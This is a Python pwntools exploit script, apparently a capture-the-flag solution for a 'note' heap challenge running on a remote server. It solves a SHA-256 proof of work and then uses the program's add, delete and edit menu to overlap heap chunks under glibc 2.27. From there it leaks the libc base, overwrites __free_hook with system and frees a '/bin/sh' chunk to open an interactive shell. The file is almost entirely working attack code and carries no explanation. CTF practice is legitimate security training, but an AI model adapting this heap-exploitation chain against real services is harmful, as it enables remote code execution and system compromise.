# coding=utf-8 
from pwn import * 
from pwnlib.util.iters import mbruteforce 
import itertools 
import base64 
context.log_level = "debug" 
context.terminal = ["/bin/tmux", "splitw", "-h"]
# sh = process("./note") 
# libc = ELF("/home/yrl/glibc-all-in-one/libs/2.27-3ubuntu1.4_amd64/libc.so.6")
libc = ELF("./libc.so.6") 
sh = remote("chuj.top",52896 ) 
sh.recvuntil(') == ') 
hash_code = sh.recvuntil('\n', drop=True).decode().strip() 
log.success('hash_code={},'.format(hash_code)) 
charset = string.printable 
proof = mbruteforce(lambda x: hashlib.sha256((x).encode()).hexdigest() == hash_code, charset, 4, method='fixed') 
sh.sendlineafter('????> ', proof)
def add(index, size, content): 
    sh.sendlineafter(">> ", "1") 
    sh.sendlineafter(">> ", str(index)) 
    sh.sendlineafter(">> ", str(size)) 
    sh.sendafter(">> ", content)

def show(index): 
    sh.sendlineafter(">> ", "2") 
    sh.sendlineafter(">> ", str(index)) 
def delete(index): 
    sh.sendlineafter(">> ", "3") 
    sh.sendlineafter(">> ", str(index)) 
def edit(index, payload): 
    sh.sendlineafter(">> ", "4") 
    sh.sendafter(">> ", str(index).ljust(8, '\x00')) 
    sh.send(payload) 
for i in range(0, 11): 
    add(i, 0xF8, "a"*0xF7) 
add(12, 0x60, '\n') 
for i in range(3, 10): 
    delete(i) 
delete(0) 
edit(1, 'a' * 0xF0 + p64(0x200)) 
delete(2) 
add(0, 0x78, "\n") 
add(0, 0x78, "\n") 
show(1) 
libc_base = u64(sh.recv(6).ljust(8, '\x00')) - libc.sym["__malloc_hook"] - 0x10 - 0x60 
log.success("libc_base={}".format(hex(libc_base))) 
__free_hook = libc_base + libc.sym["__free_hook"] 
system = libc_base + libc.sym["system"] 
# gdb.attach(sh)
add(0, 0x60, '\n') 
delete(12) 
delete(0) 
edit(1, p64(__free_hook)) 
add(1, 0x60, '/bin/sh\x00') 
add(2, 0x60, p64(system)) 
delete(1) 
sh.interactive()